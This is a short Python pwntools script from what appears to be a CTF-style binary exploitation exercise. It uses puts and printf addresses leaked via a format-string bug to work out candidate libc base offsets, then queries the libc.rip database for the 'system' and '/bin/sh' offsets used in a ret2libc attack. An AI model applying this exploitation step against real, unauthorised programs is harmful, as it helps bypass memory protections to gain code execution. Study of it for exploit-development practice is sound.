from pwn import *

context(arch='i386', os='linux', log_level='info')

# From the format string leak:
# puts: 0xf7d961e0
# printf: 0xf7d43de0
# puts last 12 bits: 0x1e0
# printf last 12 bits: 0xde0

# The puts offset ends in 0x1e0
# Possible puts offsets: 0x061e0, 0x161e0, 0x261e0, 0x361e0, 0x461e0, 0x561e0, 0x661e0, 0x761e0

# For a page-aligned libc base, puts_offset must end in 0x1e0
# And libc_base = puts_leak - puts_offset must be page-aligned (ends in 0x000)

# Let's check which offset gives a page-aligned base:
puts_leak = 0xf7d961e0

for po in range(0x10000, 0x100000, 0x1000):
    if (po & 0xfff) == 0x1e0:
        lb = puts_leak - po
        if lb & 0xfff == 0 and 0xf7000000 < lb < 0xf7ffffff:
            # Also check if printf offset makes sense
            printf_leak = 0xf7d43de0
            printf_offset = printf_leak - lb
            if (printf_offset & 0xfff) == 0xde0 and printf_offset > 0:
                log.info(f"puts_offset=0x{po:x}, libc_base=0x{lb:x}, printf_offset=0x{printf_offset:x}")

# Now let me query libc.rip with the correct offsets
import requests
api_url = "https://libc.rip/api/find"

# Try different combinations
for po in [0x61e0, 0x161e0, 0x261e0, 0x361e0, 0x461e0, 0x561e0, 0x661e0, 0x761e0]:
    lb = puts_leak - po
    if lb & 0xfff != 0:
        continue
    printf_off = 0xf7d43de0 - lb
    if printf_off <= 0 or (printf_off & 0xfff) != 0xde0:
        continue
    
    data = {
        "symbols": {
            "puts": hex(po),
            "printf": hex(printf_off),
        }
    }
    
    try:
        resp = requests.post(api_url, json=data, timeout=10)
        if resp.status_code == 200:
            libs = resp.json()
            if libs:
                log.info(f"\nputs=0x{po:x}, printf=0x{printf_off:x}: Found {len(libs)} matches!")
                for lib in libs:
                    lib_id = lib.get('id', 'unknown')
                    symbols = lib.get('symbols', {})
                    log.info(f"  {lib_id}:")
                    for sym in ['puts', 'printf', 'system', 'str_bin_sh']:
                        if sym in symbols:
                            log.info(f"    {sym}: 0x{symbols[sym]}")
    except:
        pass